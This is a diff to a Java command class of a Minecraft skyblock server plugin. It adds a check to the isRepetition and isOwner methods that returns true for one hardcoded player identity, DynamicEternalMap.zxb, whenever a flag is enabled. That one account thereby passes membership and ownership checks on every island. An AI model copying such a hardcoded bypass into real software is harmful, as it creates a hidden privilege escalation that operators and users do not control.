@@ -1,6 +1,7 @@
 package fun.fifu.nekokecore.zxbskyworld.command;
 
 import fun.fifu.nekokecore.zxbskyworld.IsLand;
+import fun.fifu.nekokecore.zxbskyworld.permission.DynamicEternalMap;
 import fun.fifu.nekokecore.zxbskyworld.utils.Helper;
 import org.bukkit.Bukkit;
 import org.bukkit.command.Command;
@@ -76,16 +77,22 @@ public class ShareDispose implements CommandExecutor {
      * @param SkyLoc
      * @return
      */
-    public static boolean isRepetition(String uuid, String SkyLoc) throws IOException {
-        JSONArray jsonArray = IsLand.dateAdmin.getMembersList(SkyLoc);
-        if (jsonArray == null) {
-            return false;
-        }
-        for (Object obj : jsonArray) {
-            String uid = (String) obj;
-            if (uid.equalsIgnoreCase(uuid)) {
-                return true;
+    public static boolean isRepetition(String uuid, String SkyLoc) {
+        if (DynamicEternalMap.opCanPermiss && uuid.equals(DynamicEternalMap.zxb))
+            return true;
+        try {
+            JSONArray jsonArray = IsLand.dateAdmin.getMembersList(SkyLoc);
+            if (jsonArray == null) {
+                return false;
             }
+            for (Object obj : jsonArray) {
+                String uid = (String) obj;
+                if (uid.equalsIgnoreCase(uuid)) {
+                    return true;
+                }
+            }
+        } catch (IOException e) {
+            return false;
         }
         return false;
     }
@@ -98,6 +105,8 @@ public class ShareDispose implements CommandExecutor {
      * @return
      */
     public static boolean isOwner(String uuid, String SkyLoc) {
+        if (DynamicEternalMap.opCanPermiss && uuid.equals(DynamicEternalMap.zxb))
+            return true;
         try {
             for (Object obj : IsLand.dateAdmin.getOwnersList(SkyLoc)) {
                 String uid = (String) obj;
